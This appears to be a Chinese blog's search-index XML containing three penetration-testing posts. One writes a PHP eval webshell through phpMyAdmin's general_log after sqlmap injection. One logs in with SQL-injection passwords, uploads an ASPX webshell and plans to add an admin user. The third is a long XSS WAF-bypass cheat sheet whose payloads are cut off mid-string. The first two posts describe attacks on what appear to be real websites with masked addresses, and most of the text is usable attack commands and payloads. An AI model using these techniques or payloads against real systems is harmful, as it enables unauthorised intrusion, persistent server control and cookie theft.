<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[phpmyadmin写入一句话]]></title>
    <url>%2F2019%2F09%2F28%2Fphpmyadmin%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%2F</url>
    <content type="text"><![CDATA[今天拿到一个网站，过程挺好玩，提到的网址我用127.0.0.1代替，这个网站存在sql注入，目录遍历，文件上传。文件包含漏洞，平常练习漏洞这个网站非常完美！ 首先打开网站127.0.0.1 有四个选项 “最新消息” “产品介绍” “代理咨询” “联络我们” “登入” ，在最新消息里发现url为127.0.0.1/news.php?id=9 看见ID所以尝试进行sql注入，我是直接放进sqlmap里直接跑了(手动滑稽)，跑的反应也挺好的有sql注入（手动开心） web server operating system: Linux Ubuntuweb application technology: Apache 2.4.7, PHP 5.5.9back-end DBMS: MySQL 5.0.11 发现服务器运行系统为Linux Ubuntu Web服务器Apache 2.4.7 语言PHP 5.5.9 数据库 MySQL 5.0.11 有了sql注入就可以搞到后台用户名登录密码，和数据库用户名登录密码。（手动滑稽） 首先我们先看一下权限是不是root权限 运行此命令sqlmap -u 127.0.0.1/news.php?id=9 –is-dba [11:30:26] [INFO] the back-end DBMS is MySQLweb server operating system: Linux Ubuntuweb application technology: Apache 2.4.7, PHP 5.5.9back-end DBMS: MySQL 5.0.11[11:30:26] [INFO] testing if current user is DBA[11:30:26] [INFO] fetching current user[11:30:26] [INFO] resumed: newesp@localhostcurrent user is DBA: True 出现true证明我们有root权限 直接运行sqlmap -u 127.0.0.1/news.php?id=9 –password database management system users password hashes : debian- sys-maint password hash: Drupal_ DB password hash: mike password hash: password: newesp password hash: *password: * phpmyadmin password hash: root password hash: 获得了两个用户名密码 mike （手动打码） newesp （手动打码） 打开URL 127.0.0.1/phpmyadmin 能直接打开phpmyadmin 输入newesp 1234568 进入数据库管理后台 可以随意查看数据（手动滑稽）。 获取了后台用户名密码 开始登陆后台 127.0.0.1/login.php 进入后台有一个档案管理选项 这里虽然有上传文件选项但是做了一定的上传限制没有进行上传绕过，但是在联络我们选项出发现一个目录遍历漏洞127.0.0.1/encode_explorer.php?dir=…/…/ 当在dir出输入一个点时可以看到全部目录 在下面进行上传shell找到真实路径有着重要的作用 经过一番折腾转到phpmyadmin进行上传shell 进入phpmyadmin 发现版本信息为 4.0.10deb1ubuntu0.1 搜索了一下这个版本的漏洞有文件包含漏洞 可以查看phpinfo 但是不是主要利用点 下面打开SQL选项 我们需要输入SQL命令来上传我们的shell SQL处执行SQL语句 首先查看general log是否开启 show variables like ‘general_log’; 成功运行（进度三分之一） 我们进入127.0.0.1/info.php 可以看到info.php的绝对路径 /var/www/html/Proic2.0/info.php 执行sql 语句 SHOW VARIABLES LIKE “secure_file_priv”; secure_file_priv /var/lib/mysql-files/ 如果值为文件夹目录，则只允许修改目录下的文件，如果值为NULL则为禁止。 general log 指的是日志保存状态，一共有两个值（ON/OFF）ON代表开启 OFF代表关闭。 general log file 指的是日志的保存路径。 执行sql 语句 SHOW VARIABLES LIKE ‘general%’ Variable_name Valuegeneral_log ONgeneral_log_file /var/www/html/Proic2.0/cache/1.php 开启general_log 的作用：开启它可以记录用户输入的每条命令，会把其保存在/var/www/html/Proic2.0/cache/1.php的一个.log文件中，其实就是我们常说的日志文件利用思路：开启general_log之后把general_log_file的值修改为该网站默认路径下的某一个自定义的php文件中，然后通过log日志进行写入一句话木马，然后再进一步利用。 12set global general_log = "ON";set global general_log_file='/var/www/html/Proic2.0/cache/ma.php'; 执行后可以看到生成的伪日志文件ma.php此时在利用日志的记录插入一句话select &#39;&lt;?php eval($_POST[cmd]);?&gt;&#39;; 打开日志可以看到记录 最后getshell]]></content>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次webshell]]></title>
    <url>%2F2019%2F09%2F20%2Fwebshell%2F</url>
    <content type="text"><![CDATA[目标网站 我用127.0.0.1代替 首先进入登录管理员的网站：127.0.0.1:81/admin/login.aspx 发现后缀名是aspx 所以尝试绕过登陆常用万能密码： asp aspx万能密码1：”or “a”=”a2：’.).or.(‘.a.’=’.a3：or 1=1–4：’or 1=1–5：a’or’ 1=1–6：”or 1=1–7：’or.’a.’=’a8：”or”=”a’=’a9：’or’’=’10：’or’=’or’ 尝试使用：用户名：‘or’’=’ 密码：‘or’’=’ 显示登陆成功 进入：127.0.0.1:81/admin/content.aspx 网站管理页面。 在页面中有增加根目录选项 创建新的根目录 编辑子栏目 在这里就有了文件上传漏洞 因为后缀名是aspx所以我们将要用aspx一句话木马： 点击上传图片按钮 将写好的1.aspx文件上传到文本框中 然后启动burpsuite进行上传抓包 抓取包： POST /admin/Product/Com_ Des .aspx?id=35 HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: texthtml,application/xhtml+xml,applicainml0 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7 ,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflate Referer: htp:/127.0.0.1:81/admin/Product/Com_ .Des .aspx?id=35Content-Type: application/x-www-form-urlencodedContent-Length: 326DNT: 1 Connection: close Cookie: ASP.NET_ Sessionld=5ve1qjazrr20bzz30t1mp55 Upgrade- Insecure- Requests: 1 VIEWSTATE=%2FwEPDwUKMTc5NzM1MDkxMw9kFglCAw9kFglCAw8WAh4JaW5uZXJodG 1sZWRkhCrYywL0VeMcbcvIKOlq%2FX06Csc%3D&amp; EVENTVALIDATION=%2FwEWBAL Pq8HvBwKrI%2Bn4BQK95pRWAoznisYGw%2BxOEKI3ESEyyIrik5P056NnjVE%3D&amp;tbnew=22&amp;fck=%3Cimg+src%3D%22%2F. admin%2FUploadlmage%2F20190920121656_ 5385. aspx%22+alt%3D%22%22+%2F%3E&amp;Button1=%E4%BF%AE%E6%94%B9 在返回包中找到我们上传的真实路径 :admin/Uploadimage/20190920121656_ 5385.aspx 使用蚁剑进行webshell连接 127.0.0.1/admin/Uploadimage/20190920121656_ 5385.aspx获得web权限 获得权限我们进行一次端口扫描Windows serverIIS6.0开放的端口80-8910251433 microsoft SQL server 200523833389 远程桌面 我们可以是用IIS提权获得管理员权限 在创建新的用户 加入管理员组 登入远程管理桌面]]></content>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS绕过]]></title>
    <url>%2F2019%2F09%2F11%2FXSS%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[XSS一些payload，考虑到在当下浏览器会做一些过滤，原始的&lt;script&gt;alert(1)&lt;/script&gt;已经不再适用当前网络环境，因此有必要做一些XSS绕过WAF的探究 WAF识别拦截XSS的原理既然要绕过WAF的拦截，那么就得明白常见的WAF是如何识别XSS 一般来讲，常见的WAF识别是基于正则匹配和指纹信息 正则匹配绕过基于正则匹配的XSS，我们可以通过FUZZ检测一些可以绕过的XSS payload，正则匹配还是非常容易绕过的，基于一些Payload变种 因为Javascript是一门脚本语言，具有较高的灵活性，通过在文末给出的payload列表Fuzz测试，筛选出一些黑名单之外的payload 参考 测试WAF来学习XSS姿势 测试WAF来学习XSS姿势（二） 测试WAF来学习XSS姿势（三） 看我如何绕过WAF的XSS检测机制 XSS Payload-Vulnerability-Lab Getting Real with XSS 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697989910010110210310410510610710810911011111211311411511611711811912012112212312412512612712812913013113213313413513613713813914014114214314414514614714814915015115215315415515615715815916016116216316416516616716816917017117217317417517617717817918018118218318418518618718818919019119219319419519619719819920020120220320420520620720820921021121221321421521621721821922022122222322422522622722822923023123223323423523623723823924024124224324424524624724824925025125225325425525625725825926026126226326426526626726826927027127227327427527627727827928028128228328428528628728828929029129229329429529629729829930030130230330430530630730830931031131231331431531631731831932032132232332432532632732832933033133233333433533633733833934034134234334434534634734834935035135235335435535635735835936036136236336436536636736836937037137237337437537637737837938038138238338438538638738838939039139239339439539639739839940040140240340440540640740840941041141241341441541641741841942042142242342442542642742842943043143243343443543643743843944044144244344444544644744844945045145245345445545645745845946046146246346446546646746846947047147247347447547647747847948048148248348448548648748848949049149249349449549649749849950050150250350450550650750850951051151251351451551651751851952052152252352452552652752852953053153253353453553653753853954054154254354454554654754854955055155255355455555655755855956056156256356456556656756856957057157257357457557657757857958058158258358458558658758858959059159259359459559659759859960060160260360460560660760860961061161261361461561661761861962062162262362462562662762862963063163263363463563663763863964064164264364464564664764864965065165265365465565665765865966066166266366466566666766866967067167267367467567667767867968068168268368468568668768868969069169269369469569669769869970070170270370470570670770870971071171271371471571671771871972072172272372472572672772872973073173273373473573673773873974074174274374474574674774874975075175275375475575675775875976076176276376476576676776876977077177277377477577677777877978078178278378478578678778878979079179279379479579679779879980080180280380480580680780880981081181281381481581681781881982082182282382482582682782882983083183283383483583683783883984084184284384484584684784884985085185285385485585685785885986086186286386486586686786886987087187287387487587687787887988088188288388488588688788888989089189289389489589689789889990090190290390490590690790890991091191291391491591691791891992092192292392492592692792892993093193293393493593693793893994094194294394494594694794894995095195295395495595695795895996096196296396496596696796896997097197297397497597697797897998098198298398498598698798898999099199299399499599699799899910001001100210031004100510061007100810091010101110121013101410151016101710181019102010211022102310241025102610271028102910301031103210331034103510361037103810391040104110421043104410451046104710481049105010511052105310541055105610571058105910601061106210631064106510661067106810691070107110721073107410751076107710781079108010811082108310841085108610871088108910901091109210931094109510961097109810991100110111021103110411051106110711081109111011111112111311141115111611171118111911201121112211231124112511261127112811291130113111321133113411351136113711381139114011411142114311441145114611471148114911501151115211531154115511561157115811591160116111621163116411651166116711681169117011711172117311741175117611771178117911801181118211831184118511861187118811891190119111921193119411951196119711981199120012011202120312041205120612071208120912101211121212131214121512161217121812191220122112221223122412251226122712281229123012311232123312341235Title: Ultimate Cross Site Scripting Attack Cheat SheetLast Update: 2018-06-28Note: This is a technical sheet for research about directory- and path traversal attacks.Please continue the ultimate directory traversal cheat sheet list or contribute to update.This cheat sheet list goes out to assist pentesters, developers, researchers &amp; whitehats.Tags to Trigger XSS Attacks:onclickondblclickonmousedownonmousemoveonmouseoveronmouseoutonmouseuponkeydownonkeypressonkeyuponabortonerroronloadonresizeonscrollonunloadonsubmitonbluronchangeonfocusonresetonselectonMoveOnBrackets for Tags&gt;""&gt;&lt;"&gt;&lt;&gt;"&lt;.\&gt;"&lt;/../&gt;%20&lt;.//&gt;%20&lt;%20/%20&gt;%20"&gt;%20&lt;%3E%3CPjw=XSS Strings:&lt;meta http-equiv="refresh" content="0;url=javascript:document.cookie=true;"&gt;&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;document.cookie=true&lt;/SCRIPT&gt;"&gt;&lt;SCRIPT&gt;document.cookie=true;&lt;/SCRIPT&gt;&lt;IMG SRC="jav ascript:document.cookie=true;"&gt;&lt;IMG SRC="javascript:document.cookie=true;"&gt;&lt;IMG SRC=" &amp;#14; javascript:document.cookie=true;"&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=document.cookie=true;&gt;&lt;SCRIPT&gt;document.cookie=true;//&lt;&lt;/SCRIPT&gt;&lt;SCRIPT &lt;B&gt;document.cookie=true;&lt;/SCRIPT&gt;&lt;IMG SRC="javascript:document.cookie=true;"&gt;&lt;iframe src="javascript:document.cookie=true;&gt; &lt;SCRIPT&gt;a=/XSS/\ndocument.cookie=true;&lt;/SCRIPT&gt; &lt;/TITLE&gt;&lt;SCRIPT&gt;document.cookie=true;&lt;/SCRIPT&gt;&lt;INPUT TYPE="IMAGE" SRC="javascript:document.cookie=true;"&gt;&lt;BODY BACKGROUND="javascript:document.cookie=true;"&gt;&lt;BODY ONLOAD=document.cookie=true;&gt;&lt;IMG DYNSRC="javascript:document.cookie=true;"&gt;&lt;IMG LOWSRC="javascript:document.cookie=true;"&gt;&lt;BGSOUND SRC="javascript:document.cookie=true;"&gt;&lt;BR SIZE="&amp;&#123;document.cookie=true&#125;"&gt;&lt;LAYER SRC="javascript:document.cookie=true;"&gt;&lt;/LAYER&gt;&lt;LINK REL="stylesheet" HREF="javascript:document.cookie=true;"&gt;&lt;STYLE&gt;li &#123;list-style-image: url("javascript:document.cookie=true;");&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS Ľscriptľdocument.cookie=true;Ľ/scriptľ &lt;IFRAME SRC="javascript:document.cookie=true;"&gt;&lt;/IFRAME&gt;&lt;FRAMESET&gt;&lt;FRAME SRC="javascript:document.cookie=true;"&gt;&lt;/FRAMESET&gt;&lt;TABLE BACKGROUND="javascript:document.cookie=true;"&gt;&lt;TABLE&gt;&lt;TD BACKGROUND="javascript:document.cookie=true;"&gt;&lt;DIV STYLE="background-image: url(javascript:document.cookie=true;)"&gt;&lt;DIV STYLE="background-image: url(&amp;#1;javascript:document.cookie=true;)"&gt;&lt;DIV STYLE="width: expression(document.cookie=true);"&gt;&lt;STYLE&gt;@im\port'\ja\vasc\ript:document.cookie=true';&lt;/STYLE&gt;&lt;IMG STYLE="xss:expr/*XSS*/ession(document.cookie=true)"&gt;&lt;XSS STYLE="xss:expression(document.cookie=true)"&gt; exp/*&lt;A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(document.cookie=true)'&gt; &lt;STYLE TYPE="text/javascript"&gt;document.cookie=true;&lt;/STYLE&gt; &lt;STYLE&gt;.XSS&#123;background-image:url("javascript:document.cookie=true");&#125;&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt; &lt;STYLE type="text/css"&gt;BODY&#123;background:url("javascript:document.cookie=true")&#125;&lt;/STYLE&gt; &lt;SCRIPT&gt;document.cookie=true;&lt;/SCRIPT&gt;&lt;BASE HREF="javascript:document.cookie=true;//"&gt;&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:document.cookie=true&gt;&lt;/OBJECT&gt;&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC="javas]]&lt;![CDATA[cript:document.cookie=true;"&gt;]]&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;&lt;XML ID="xss"&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC="javas&lt;!-- --&gt;cript:document.cookie=true"&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;&lt;SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"&gt;&lt;/SPAN&gt;&lt;HTML&gt;&lt;BODY&gt;&lt;?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"&gt;&lt;?import namespace="t" implementation="#default#time2"&gt;&lt;t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;document.cookie=true&lt;/SCRIPT&gt;"&gt;&lt;/BODY&gt;&lt;/HTML&gt;&lt;? echo('&lt;SCR)';echo('IPT&gt;document.cookie=true&lt;/SCRIPT&gt;'); ?&gt;&lt;HEAD&gt;&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-document.cookie=true;+ADw-/SCRIPT+AD4-&lt;a href="javascript#document.cookie=true;"&gt;&lt;div onmouseover="document.cookie=true;"&gt;&lt;img src="javascript:document.cookie=true;"&gt;&lt;img dynsrc="javascript:document.cookie=true;"&gt;&lt;input type="image" dynsrc="javascript:document.cookie=true;"&gt;&lt;bgsound src="javascript:document.cookie=true;"&gt;&amp;&lt;script&gt;document.cookie=true;&lt;/script&gt; &amp;&#123;document.cookie=true;&#125;; &lt;img src=&amp;&#123;document.cookie=true;&#125;;&gt; &lt;link rel="stylesheet" href="javascript:document.cookie=true;"&gt; &lt;img src="mocha:document.cookie=true;"&gt;@mario_payload&lt;img src="livescript:document.cookie=true;"&gt; &lt;a href="about:&lt;script&gt;document.cookie=true;&lt;/script&gt;"&gt; &lt;body onload="document.cookie=true;"&gt; &lt;div style="background-image: url(javascript:document.cookie=true;);"&gt; &lt;div style="behaviour: url([link to code]);"&gt; &lt;div style="binding: url([link to code]);"&gt; &lt;div style="width: expression(document.cookie=true;);"&gt;&lt;style type="text/javascript"&gt;document.cookie=true;&lt;/style&gt;&lt;object classid="clsid:..." codebase="javascript:document.cookie=true;"&gt;&lt;style&gt;&lt;!--&lt;/style&gt;&lt;script&gt;document.cookie=true;//--&gt;&lt;/script&gt;&lt;&lt;script&gt;document.cookie=true;&lt;/script&gt;&lt;script&gt;document.cookie=true;//--&gt;&lt;/script&gt;&lt;!-- -- --&gt;&lt;script&gt;document.cookie=true;&lt;/script&gt;&lt;!-- -- --&gt;&lt;img src="blah"onmouseover="document.cookie=true;"&gt;&lt;img src="blah&gt;" onmouseover="document.cookie=true;"&gt;&lt;xml src="javascript:document.cookie=true;"&gt;&lt;xml id="X"&gt;&lt;a&gt;&lt;b&gt;&lt;script&gt;document.cookie=true;&lt;/script&gt;;&lt;/b&gt;&lt;/a&gt;&lt;/xml&gt;&lt;div datafld="b" dataformatas="html" datasrc="#X"&gt;&lt;/div&gt; ]]&gt; [\xC0][\xBC]script&gt;document.cookie=true;[\xC0][\xBC]/script&gt;Restriction Bypass:&gt;"&lt;iframe src=http://global-evolution.info/&gt;@gmail.com&gt;"&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;div style="1@gmail.com&gt;"&lt;script&gt;alert(document.cookie)&lt;/script&gt;@gmail.com&lt;html&gt;&lt;body&gt;&lt;button.onclick="alert(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,34,67,114,111,115,115,83,105,116,101,83,99,114,105,112,116,105,110,103,64,82,69,77,79,86,69,34,41,60,47,115,99,114,105,112,116,62));"&gt;String:from.Char.Code&lt;/button&gt;&lt;/body&gt;&lt;/html&gt;%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%22%43%72%6F%73%73%53%69%74%65%53%63%72%69%70%74%69%6E%67%32%22%29%3C%2F%73%63%72%69%70%74%3EObfuscated Bypass:&gt;“&lt;ScriPt&gt;ALeRt("xssOBFSbypass")&lt;/scriPt&gt;XSS with close TAG to escape:&gt;"&lt;meta http-equiv="refresh" content="0;url=javascript:document.cookie=true;"&gt;&gt;"&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;document.cookie=true&lt;/SCRIPT&gt;"&gt;&gt;"&lt;SCRIPT&gt;document.cookie=true;&lt;/SCRIPT&gt;&gt;"&lt;IMG SRC="jav ascript:document.cookie=true;"&gt;&gt;"&lt;IMG SRC="javascript:document.cookie=true;"&gt;&gt;"&lt;IMG SRC=" &amp;#14; javascript:document.cookie=true;"&gt;&gt;"&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=document.cookie=true;&gt;&gt;"&lt;SCRIPT&gt;document.cookie=true;//&lt;&lt;/SCRIPT&gt;&gt;"&lt;SCRIPT &lt;B&gt;document.cookie=true;&lt;/SCRIPT&gt;&gt;"&lt;IMG SRC="javascript:document.cookie=true;"&gt;&gt;"&lt;iframe src="javascript:document.cookie=true;&gt; &gt;"&lt;SCRIPT&gt;a=/XSS/\ndocument.cookie=true;&lt;/SCRIPT&gt; &gt;"&lt;/TITLE&gt;&lt;SCRIPT&gt;document.cookie=true;&lt;/SCRIPT&gt;&gt;"&lt;INPUT TYPE="IMAGE" SRC="javascript:document.cookie=true;"&gt;&gt;"&lt;BODY BACKGROUND="javascript:document.cookie=true;"&gt;&gt;"&lt;BODY ONLOAD=document.cookie=true;&gt;&gt;"&lt;IMG DYNSRC="javascript:document.cookie=true;"&gt;&gt;"&lt;IMG LOWSRC="javascript:document.cookie=true;"&gt;&gt;"&lt;BGSOUND SRC="javascript:document.cookie=true;"&gt;&gt;"&lt;BR SIZE="&amp;&#123;document.cookie=true&#125;"&gt;&gt;"&lt;LAYER SRC="javascript:document.cookie=true;"&gt;&lt;/LAYER&gt;&gt;"&lt;LINK REL="stylesheet" HREF="javascript:document.cookie=true;"&gt;&gt;"&lt;STYLE&gt;li &#123;list-style-image: url("javascript:document.cookie=true;");&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS &gt;"Ľscriptľdocument.cookie=true;Ľ/scriptľ &gt;"&lt;IFRAME SRC="javascript:document.cookie=true;"&gt;&lt;/IFRAME&gt;&gt;"&lt;FRAMESET&gt;&lt;FRAME SRC="javascript:document.cookie=true;"&gt;&lt;/FRAMESET&gt;&gt;"&lt;TABLE BACKGROUND="javascript:document.cookie=true;"&gt;&gt;"&lt;TABLE&gt;&lt;TD BACKGROUND="javascript:document.cookie=true;"&gt;&gt;"&lt;DIV STYLE="background-image: url(javascript:document.cookie=true;)"&gt;&gt;"&lt;DIV STYLE="background-image: url(&amp;#1;javascript:document.cookie=true;)"&gt;&gt;"&lt;DIV STYLE="width: expression(document.cookie=true);"&gt;&gt;"&lt;STYLE&gt;@im\port'\ja\vasc\ript:document.cookie=true';&lt;/STYLE&gt;&gt;"&lt;IMG STYLE="xss:expr/*XSS*/ession(document.cookie=true)"&gt;&gt;"&lt;XSS STYLE="xss:expression(document.cookie=true)"&gt; &gt;"exp/*&lt;A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(document.cookie=true)'&gt; &gt;"&lt;STYLE TYPE="text/javascript"&gt;document.cookie=true;&lt;/STYLE&gt; &gt;"&lt;STYLE&gt;.XSS&#123;background-image:url("javascript:document.cookie=true");&#125;&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt; &gt;"&lt;STYLE type="text/css"&gt;BODY&#123;background:url("javascript:document.cookie=true")&#125;&lt;/STYLE&gt; &gt;"&lt;SCRIPT&gt;document.cookie=true;&lt;/SCRIPT&gt;&gt;"&lt;BASE HREF="javascript:document.cookie=true;//"&gt;&gt;"&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:document.cookie=true&gt;&lt;/OBJECT&gt;&gt;"&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC="javas]]&lt;![CDATA[cript:document.cookie=true;"&gt;]]&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;&gt;"&lt;XML ID="xss"&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC="javas&lt;!-- --&gt;cript:document.cookie=true"&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;&lt;SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"&gt;&lt;/SPAN&gt;&gt;"&lt;HTML&gt;&lt;BODY&gt;&lt;?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"&gt;&lt;?import namespace="t" implementation="#default#time2"&gt;&lt;t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;document.cookie=true&lt;/SCRIPT&gt;"&gt;&lt;/BODY&gt;&lt;/HTML&gt;&gt;"&lt;? echo('&lt;SCR)';echo('IPT&gt;document.cookie=true&lt;/SCRIPT&gt;'); ?&gt;&gt;"&lt;HEAD&gt;&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-document.cookie=true;+ADw-/SCRIPT+AD4-&gt;"&lt;a href="javascript#document.cookie=true;"&gt;&gt;"&lt;div onmouseover="document.cookie=true;"&gt;&gt;"&lt;img src="javascript:document.cookie=true;"&gt;&gt;"&lt;img dynsrc="javascript:document.cookie=true;"&gt;&gt;"&lt;input type="image" dynsrc="javascript:document.cookie=true;"&gt;&gt;"&lt;bgsound src="javascript:document.cookie=true;"&gt;&gt;"&amp;&lt;script&gt;document.cookie=true;&lt;/script&gt; &gt;"&amp;&#123;document.cookie=true;&#125;; &gt;"&lt;img src=&amp;&#123;document.cookie=true;&#125;;&gt; &gt;"&lt;link rel="stylesheet" href="javascript:document.cookie=true;"&gt; &gt;"&lt;img src="mocha:document.cookie=true;"&gt; &gt;"&lt;img src="livescript:document.cookie=true;"&gt; &gt;"&lt;a href="about:&lt;script&gt;document.cookie=true;&lt;/script&gt;"&gt; &gt;"&lt;body onload="document.cookie=true;"&gt; &gt;"&lt;div style="background-image: url(javascript:document.cookie=true;);"&gt; &gt;"&lt;div style="behaviour: url([link to code]);"&gt; &gt;"&lt;div style="binding: url([link to code]);"&gt; &gt;"&lt;div style="width: expression(document.cookie=true;);"&gt;&gt;"&lt;style type="text/javascript"&gt;document.cookie=true;&lt;/style&gt;&gt;"&lt;object classid="clsid:..." codebase="javascript:document.cookie=true;"&gt;&gt;"&lt;style&gt;&lt;!--&lt;/style&gt;&lt;script&gt;document.cookie=true;//--&gt;&lt;/script&gt;&gt;"&lt;&lt;script&gt;document.cookie=true;&lt;/script&gt;&gt;"&lt;script&gt;document.cookie=true;//--&gt;&lt;/script&gt;&gt;"&lt;!-- -- --&gt;&lt;script&gt;document.cookie=true;&lt;/script&gt;&lt;!-- -- --&gt;&gt;"&lt;img src="blah"onmouseover="document.cookie=true;"&gt;&gt;"&lt;img src="blah&gt;" onmouseover="document.cookie=true;"&gt;&gt;"&lt;xml src="javascript:document.cookie=true;"&gt;&gt;"&lt;xml id="X"&gt;&lt;a&gt;&lt;b&gt;&lt;script&gt;document.cookie=true;&lt;/script&gt;;&lt;/b&gt;&lt;/a&gt;&lt;/xml&gt;&gt;"&lt;div datafld="b" dataformatas="html" datasrc="#X"&gt;&lt;/div&gt; ]]&gt; [\xC0][\xBC]script&gt;document.cookie=true;[\xC0][\xBC]/script&gt;Others: Random';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;'';!--"&lt;XSS&gt;=&amp;&#123;()&#125;&lt;SCRIPT SRC=http://test.com/xss.js&gt;&lt;/SCRIPT&gt;&lt;IMG SRC="javascript:alert('XSS');"&gt;&lt;IMG SRC=javascript:alert('XSS')&gt;&lt;IMG SRC=JaVaScRiPt:alert('XSS')&gt;&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;&lt;IMG SRC=`javascript:alert("RM'XSS'")`&gt;&lt;IMG """&gt;&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;"&gt;&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;&lt;IMG SRC="jav ascript:alert('XSS');"&gt;&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"&gt;&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS');"&gt;&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"&gt;&lt;IMGSRC="javascript:alert('XSS')"&gt;perl -e 'print "&lt;IMG SRC=java\0script:alert(\"XSS\")&gt;";' &gt; outperl -e 'print "&lt;SCR\0IPT&gt;alert(\"XSS\")&lt;/SCR\0IPT&gt;";' &gt; out&lt;IMG SRC=" &amp;#14; javascript:alert('XSS');"&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")&gt;&lt;&lt;SCRIPT&gt;alert("XSS");//&lt;&lt;/SCRIPT&gt;&lt;SCRIPT SRC=http://test.com/xss.js?&lt;B&gt;&lt;SCRIPT SRC=//test.com/.j&gt;&lt;IMG SRC="javascript:alert('XSS')"&lt;iframe src=http://test.com/index.html &lt;&lt;SCRIPT&gt;a=/XSS/ alert(a.source)&lt;/SCRIPT&gt;\";alert('XSS');//&lt;/TITLE&gt;&lt;SCRIPT&gt;alert("XSS");&lt;/SCRIPT&gt;&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"&gt;&lt;BODY BACKGROUND="javascript:alert('XSS')"&gt;&lt;BODY ONLOAD=alert('XSS')&gt;&lt;IMG DYNSRC="javascript:alert('XSS')"&gt;&lt;IMG LOWSRC="javascript:alert('XSS')"&gt;&lt;BGSOUND SRC="javascript:alert('XSS');"&gt;&lt;BR SIZE="&amp;&#123;alert('XSS')&#125;"&gt;&lt;LAYER SRC="http://test/script.html"&gt;&lt;/LAYER&gt;&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"&gt;&lt;LINK REL="stylesheet" HREF="http://test.com/xss.css"&gt;&lt;STYLE&gt;@import'http://test.com/xss.css';&lt;/STYLE&gt;&lt;META HTTP-EQUIV="Link" Content="&lt;http://test.com/xss.css&gt;; REL=stylesheet"&gt;&lt;STYLE&gt;BODY&#123;-moz-binding:url("http://test.com/xssmoz.xml#xss")&#125;&lt;/STYLE&gt;&lt;XSS STYLE="behavior: url(xss.htc);"&gt;&lt;STYLE&gt;li &#123;list-style-image: url("javascript:alert('XSS')");&#125;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;IMG SRC='vbscript:msgbox("XSS")'&gt;&lt;IMG SRC="mocha:[code]"&gt;&lt;IMG SRC="livescript:[code]"&gt;Ľscriptľalert(˘XSS˘)Ľ/scriptľ&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"&gt;&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"&gt;&lt;META HTTP-EQUIV="refresh" CONTENT="0; 